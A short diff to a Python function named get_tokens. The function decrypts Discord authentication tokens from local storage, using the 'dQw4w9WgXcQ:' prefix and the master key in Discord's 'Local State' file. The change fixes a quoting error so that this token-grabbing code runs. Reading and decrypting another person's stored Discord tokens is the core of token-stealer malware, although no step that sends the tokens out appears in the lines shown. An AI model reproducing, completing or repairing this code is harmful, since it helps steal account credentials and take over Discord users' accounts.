@@ -34,7 +34,7 @@ def get_tokens(debug: bool = False):
                 try:
                     token = _decrypt_val(
                         base64.b64decode(y.split("dQw4w9WgXcQ:")[1]),
-                        _get_master_key(f"{os.getenv("appdata")}\\discord\\Local State")
+                        _get_master_key(f"{os.getenv('appdata')}\\discord\\Local State")
                     )
 
                     if token not in tokens:
